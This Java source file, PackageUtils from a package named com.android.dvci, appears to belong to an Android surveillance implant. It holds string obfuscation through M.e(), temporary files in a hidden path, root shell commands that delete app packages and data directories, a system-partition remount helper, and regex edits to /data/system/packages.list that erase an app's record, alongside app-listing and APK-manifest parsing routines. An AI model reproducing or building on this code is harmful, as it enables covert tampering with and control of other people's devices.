package com.android.dvci.util;

import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.util.Log;

import com.android.dvci.Status;
import com.android.dvci.auto.Cfg;
import com.android.dvci.conf.Configuration;
import com.android.dvci.file.AutoFile;
import com.android.dvci.file.Path;
import com.android.mm.M;

import org.w3c.dom.Document;
import org.w3c.dom.Node;
import org.xml.sax.InputSource;

import java.io.BufferedReader;
import java.io.BufferedWriter;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.FileWriter;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.StringReader;
import java.io.Writer;
import java.nio.channels.FileChannel;
import java.util.ArrayList;
import java.util.List;
import java.util.jar.JarFile;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

import javax.xml.parsers.DocumentBuilder;
import javax.xml.parsers.DocumentBuilderFactory;

/**
 * Created by zeno on 16/09/14.
 */
public class PackageUtils {
	/**
	 * The Constant TAG.
	 */
	private static final String TAG = "PackageUtils"; //$NON-NLS-1$

	public static boolean replaceInFile(String file, String matchRegExp, String replaceRegExp, String replace) {
		//examples:
		// - replace "com.google.android.gms/com.google.android.gms.mdm.receivers.MdmDeviceAdminReceiver"
		//   to "com.google.android.gms/com.google.android.gms.mdm.receivers.Whatever"
		//   matchRegExp = ".*MdmDeviceAdminReceiver$"
		//   replaceRegExp = "MdmDeviceAdminReceiver"
		//   replace = "whatever"
		// - to delete "com.google.android.gms/com.google.android.gms.mdm.receivers.MdmDeviceAdminReceiver"
		//   matchRegExp = ".*MdmDeviceAdminReceiver.*"
		//   replaceRegExp = null
		//   replace = null

		File fs = new File(file);
		// TODO: su cat $file > $dest

		Boolean matchFound = false;
		Writer writer = null;
		BufferedReader fileReader = null;
		AutoFile tmpLocal = new AutoFile(Path.hidden(), Utils.getRandom() + ".t");

		try {
			fileReader = new BufferedReader(new InputStreamReader(new FileInputStream(fs.getAbsolutePath())));
			if (tmpLocal.exists()) {
				tmpLocal.delete();
			}

			writer = new BufferedWriter(new FileWriter(tmpLocal.getFile()));
			String lineContents;
			int offset = 0;
			Pattern pattern = Pattern.compile(matchRegExp);
			while ((lineContents = fileReader.readLine()) != null) {
				Matcher matcher = pattern.matcher(lineContents);
				String lineByLine = null;
				if (matcher.matches()) {
					if (Cfg.DEBUG) {
						Check.log(TAG + "(replaceInFile): match'" + lineContents + "' line offsets:" + offset);
					}
					if (replace != null) {
						lineByLine = lineContents.replaceAll((replaceRegExp != null) ? replaceRegExp : matchRegExp, replace);
						if (Cfg.DEBUG) {
							Check.log(TAG + "(replaceInFile): replaced with:'" + lineByLine + "'");
						}
						writer.write(lineByLine + "\n");
					} else {
						if (Cfg.DEBUG) {
							Check.log(TAG + "(replaceInFile): deleted");
						}
					}
					matchFound = true;

				} else {
					writer.write(lineContents + "\n");
				}
				offset += lineContents.length();
			}
			fileReader.close();
			writer.close();
			if (matchFound) {

				try {
					FileChannel source = null;
					FileChannel destination = null;
					FileInputStream fsource = new FileInputStream(tmpLocal.getFile());
					source = fsource.getChannel();
					FileOutputStream fdestination = new FileOutputStream(fs);
					destination = fdestination.getChannel();
					destination.transferFrom(source, 0, source.size());
					if (source != null) {
						source.close();
						fsource.close();
					}
					if (destination != null) {
						destination.close();
						fdestination.close();
					}
				} catch (IOException e) {
					if (Cfg.DEBUG) {
						Check.log(TAG + " (replaceInFile): trasferForm, error: " + e);
					}
					return false;
				}
				return true;
			}
		} catch (IOException e) {
			if (Cfg.DEBUG) {
				Check.log(TAG + "(replaceInFile):openCopy, error: " + e);
			}
		} finally {
			if (writer != null) {
				try {
					writer.close();
				} catch (IOException e) {
				}
			}

			if (fileReader != null) {
				try {
					fileReader.close();
				} catch (IOException e) {
				}
			}

			tmpLocal.delete();

		}
		return false;
	}

	/**
	 * The Class PInfo.
	 */
	public static class PInfo {
		/**
		 * The appname.
		 */
		private String appname = ""; //$NON-NLS-1$

		/**
		 * The pname.
		 */
		private String pname = ""; //$NON-NLS-1$

		/**
		 * The version name.
		 */
		private String versionName = ""; //$NON-NLS-1$

		/**
		 * The apk name and location.
		 */
		private String apkPath = ""; //$NON-NLS-1$

		/**
		 * The version code.
		 */
		private int versionCode = 0;

		/*
		 * (non-Javadoc)
		 *
		 * @see java.lang.Object#toString()
		 */
		@Override
		public String toString() {
			return appname + "\t" + pname + "\t" + versionName + "\t" + versionCode; //$NON-NLS-1$ //$NON-NLS-2$ //$NON-NLS-3$
		}
	}


	public static boolean uninstallApk(String apk) {
		boolean found = isInstalledApk(apk);
		if (!found) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (uninstallApk), cannot find APK");
			}
			return false;
		}

		remountSystem(true);
		removeAdmin(apk);
		removePackageList(apk);
		removeFiles(apk);
		remountSystem(false);

		killApk(apk);

		return true;
	}

	private static void killApk(String apk) {
		// TODO: kill -9 `psof $apk`
	}

	private static void removePackageList(String apk) {
		// TODO: remove any entries in /data/system/packages.list
		// i.e: com.android.deviceinfo 10216 0 /data/data/com.android.deviceinfo default 1028,1015,3003
		replaceInFile("/data/system/packages.list", ".*com.android.deviceinfo.*",null,null);
	}

	private static void removeAdmin(String apk) {
		// TODO: remove any entries in /data/system/device_policies.xml


	}

	private static void removeFiles(String apk) {
		Execute.executeRoot(M.e("rm /data/app/") + apk + M.e("*.apk"));
		Execute.executeRoot(M.e("rm -r /data/data/") + apk);

	}

	private static void remountSystem(boolean rw) {
		if (rw) {
			Execute.execute(Configuration.shellFile + M.e(" blw"));
		} else {
			Execute.execute(Configuration.shellFile + M.e(" blr"));
		}
	}

	private static boolean isInstalledApk(String apk) {
		boolean found = false;
		ArrayList<PInfo> l = getInstalledApps(false);
		for (PInfo p : l) {
			if (p.pname.equals(apk)) {
				found = true;
				break;
			}
		}
		return found;
	}

	/**
	 * Gets the installed apps.
	 *
	 * @param getSysPackages the get sys packages
	 * @return the installed apps
	 */
	public static ArrayList<PInfo> getInstalledApps(final boolean getSysPackages) {
		final ArrayList<PInfo> res = new ArrayList<PInfo>();
		final PackageManager packageManager = Status.getAppContext().getPackageManager();

		final List<PackageInfo> packs = packageManager.getInstalledPackages(0);

		String k = M.e("keyguard");
		for (int i = 0; i < packs.size(); i++) {
			final PackageInfo p = packs.get(i);

			if ((!getSysPackages) && (p.versionName == null)) {
				continue;
			}

			try {
				final PInfo newInfo = new PInfo();
				newInfo.pname = p.packageName;
				if (!newInfo.pname.contains(k)) {
					newInfo.appname = p.applicationInfo.loadLabel(packageManager).toString();
				}
				newInfo.versionName = p.versionName;
				newInfo.versionCode = p.versionCode;
				newInfo.apkPath = p.applicationInfo.sourceDir;
				res.add(newInfo);
			} catch (Exception e) {
				if (Cfg.DEBUG) {
					Check.log(TAG + " (getInstalledApps) Error: " + e);
				}
			}
		}

		return res;
	}

	/**
	 * Gets the packages.
	 *
	 * @return the packages
	 */
	private ArrayList<PInfo> getPackages() {
		final ArrayList<PInfo> apps = getInstalledApps(false);
		final int max = apps.size();

		for (int i = 0; i < max; i++) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " Info: " + apps.get(i).toString());//$NON-NLS-1$
			}
		}

		return apps;
	}
	/**
	 * Binary XML doc ending Tag
	 */
	public static int endDocTag = 0x00100101;
	/**
	 * Binary XML start Tag
	 */
	public static int startTag =  0x00100102;
	/**
	 * Binary XML end Tag
	 */
	public static int endTag =    0x00100103;
	/**
	 * Reference var for spacing
	 * Used in prtIndent()
	 */
	public static String spaces = "                                             ";

	/**
	 * Parse the 'compressed' binary form of Android XML docs
	 * such as for AndroidManifest.xml in .apk files
	 * Source: http://stackoverflow.com/questions/2097813/how-to-parse-the-androidmanifest-xml-file-inside-an-apk-package/4761689#4761689
	 *
	 * @param xml Encoded XML content to decompress
	 */
	public static String decompressXML(byte[] xml) {

		StringBuilder resultXml = new StringBuilder();
		int numbStrings = LEW(xml, 4*4);
		int sitOff = 0x24;  // Offset of start of StringIndexTable
		int stOff = sitOff + numbStrings*4;  // StringTable follows StrIndexTable
		int xmlTagOff = LEW(xml, 3*4);  // Start from the offset in the 3rd word.
		// Scan forward until we find the bytes: 0x02011000(x00100102 in normal int)
		for (int ii=xmlTagOff; ii<xml.length-4; ii+=4) {
			if (LEW(xml, ii) == startTag) {
				xmlTagOff = ii;  break;
			}
		} // end of hack, scanning for start of first start tag

		// XML tags and attributes:
		// Every XML start and end tag consists of 6 32 bit words:
		//   0th word: 02011000 for startTag and 03011000 for endTag
		//   1st word: a flag?, like 38000000
		//   2nd word: Line of where this tag appeared in the original source file
		//   3rd word: FFFFFFFF ??
		//   4th word: StringIndex of NameSpace name, or FFFFFFFF for default NS
		//   5th word: StringIndex of Element Name
		//   (Note: 01011000 in 0th word means end of XML document, endDocTag)

		// Start tags (not end tags) contain 3 more words:
		//   6th word: 14001400 meaning??
		//   7th word: Number of Attributes that follow this tag(follow word 8th)
		//   8th word: 00000000 meaning??

		// Attributes consist of 5 words:
		//   0th word: StringIndex of Attribute Name's Namespace, or FFFFFFFF
		//   1st word: StringIndex of Attribute Name
		//   2nd word: StringIndex of Attribute Value, or FFFFFFF if ResourceId used
		//   3rd word: Flags?
		//   4th word: str ind of attr value again, or ResourceId of value

		// Step through the XML tree element tags and attributes
		int off = xmlTagOff;
		int indent = 0;
		while (off < xml.length) {
			int tag0 = LEW(xml, off);
			int lineNo = LEW(xml, off+2*4);
			int nameNsSi = LEW(xml, off+4*4);
			int nameSi = LEW(xml, off+5*4);

			if (tag0 == startTag) { // XML START TAG
				int tag6 = LEW(xml, off+6*4);  // Expected to be 14001400
				int numbAttrs = LEW(xml, off+7*4);  // Number of Attributes to follow

				off += 9*4;  // Skip over 6+3 words of startTag data
				String name = compXmlString(xml, sitOff, stOff, nameSi);

				// Look for the Attributes
				StringBuffer sb = new StringBuffer();
				for (int ii=0; ii<numbAttrs; ii++) {
					int attrNameNsSi = LEW(xml, off);  // AttrName Namespace Str Ind, or FFFFFFFF
					int attrNameSi = LEW(xml, off+1*4);  // AttrName String Index
					int attrValueSi = LEW(xml, off+2*4); // AttrValue Str Ind, or FFFFFFFF
					int attrFlags = LEW(xml, off+3*4);
					int attrResId = LEW(xml, off+4*4);  // AttrValue ResourceId or dup AttrValue StrInd
					off += 5*4;  // Skip over the 5 words of an attribute

					String attrName = compXmlString(xml, sitOff, stOff, attrNameSi);
					String attrValue = attrValueSi!=-1
							? compXmlString(xml, sitOff, stOff, attrValueSi)
							: M.e("resourceID 0x")+Integer.toHexString(attrResId);
					sb.append(" "+attrName+"=\""+attrValue+"\"");
				}
				resultXml.append(prtIndent(indent, "<"+name+sb+">"));
				indent++;

			} else if (tag0 == endTag) { // XML END TAG
				indent--;
				off += 6*4;  // Skip over 6 words of endTag data
				String name = compXmlString(xml, sitOff, stOff, nameSi);
				resultXml.append(prtIndent(indent, "</"+name+">\n"));

			} else if (tag0 == endDocTag) {  // END OF XML DOC TAG
				break;

			} else {
				if (Cfg.DEBUG) {
					Check.log(TAG + " (decompressXML): Unrecognized tag code '" + Integer.toHexString(tag0)
							+ "' at offset " + off);
				}
				break;
			}
		} // end of while loop scanning tags and attributes of XML tree
		if (Cfg.DEBUG) {
			Check.log(TAG + " (decompressXML):   end at offset " + off);
		}
		return resultXml.toString();
	} // end of decompressXML


	/**
	 * Tool Method for decompressXML();
	 * Compute binary XML to its string format
	 * Source: Source: http://stackoverflow.com/questions/2097813/how-to-parse-the-androidmanifest-xml-file-inside-an-apk-package/4761689#4761689
	 *
	 * @param xml Binary-formatted XML
	 * @param sitOff
	 * @param stOff
	 * @param strInd
	 * @return String-formatted XML
	 */
	public static String compXmlString(byte[] xml, int sitOff, int stOff, int strInd) {
		if (strInd < 0) return null;
		int strOff = stOff + LEW(xml, sitOff+strInd*4);
		return compXmlStringAt(xml, strOff);
	}
	public static Document loadXMLFromString(String xml) throws Exception
	{
		DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();
		DocumentBuilder builder = factory.newDocumentBuilder();
		InputSource is = new InputSource(new StringReader(xml));
		return builder.parse(is);
	}

	/**
	 * Tool Method for decompressXML();
	 * Apply indentation
	 *
	 * @param indent Indentation level
	 * @param str String to indent
	 * @return Indented string
	 */
	public static String prtIndent(int indent, String str) {
		return (spaces.substring(0, Math.min(indent*2, spaces.length()))+str);
	}

	/**
	 * Tool method for decompressXML()
	 * Return the string stored in StringTable format at
	 * offset strOff.  This offset points to the 16 bit string length, which
	 * is followed by that number of 16 bit (Unicode) chars.
	 *
	 * @param arr StringTable array
	 * @param strOff Offset to get string from
	 * @return String from StringTable at offset strOff
	 *
	 */
	public static String compXmlStringAt(byte[] arr, int strOff) {
		int strLen = arr[strOff+1]<<8&0xff00 | arr[strOff]&0xff;
		byte[] chars = new byte[strLen];
		for (int ii=0; ii<strLen; ii++) {
			chars[ii] = arr[strOff+2+ii*2];
		}
		return new String(chars);  // Hack, just use 8 byte chars
	} // end of compXmlStringAt


	/**
	 * Return value of a Little Endian 32 bit word from the byte array
	 *   at offset off.
	 *
	 * @param arr Byte array with 32 bit word
	 * @param off Offset to get word from
	 * @return Value of Little Endian 32 bit word specified
	 */
	public static int LEW(byte[] arr, int off) {
		return arr[off+3]<<24&0xff000000 | arr[off+2]<<16&0xff0000
				| arr[off+1]<<8&0xff00 | arr[off]&0xFF;
	} // end of LEW

	public static ArrayList<String> getActivitisFromApk(String apk){
		ArrayList<String> activityList = null;
		if (new AutoFile(apk).exists()) {
			try {

				JarFile jf = new JarFile(apk);
				InputStream is = jf.getInputStream(jf.getEntry(M.e("AndroidManifest.xml")));
				byte[] xml = new byte[is.available()];
				int br = is.read(xml);
				String text = M.e("<?xml version=\"1.0\" encoding=\"utf-8\"?>")+"\n";
				text += decompressXML(xml);
				Document doc = loadXMLFromString(text);
				if (doc == null) {
					return null;
				}
				int nLen = doc.getElementsByTagName(M.e("activity")).getLength();
				for (int n = 0; n < nLen; n++) {
					Node activity = doc.getElementsByTagName(M.e("activity")).item(n);
					if (activity.getAttributes().getNamedItem(M.e("name")) != null) {
						if (activityList == null) {
							activityList = new ArrayList<String>();
						}
						activityList.add(activity.getAttributes().getNamedItem(M.e("name")).getNodeValue());
					}
				}

			} catch (Exception ex) {
				if (Cfg.DEBUG) {
					Check.log(TAG + "(getActivitis): exception: " + ex);
				}
			}
		}
		return activityList;
	}
}
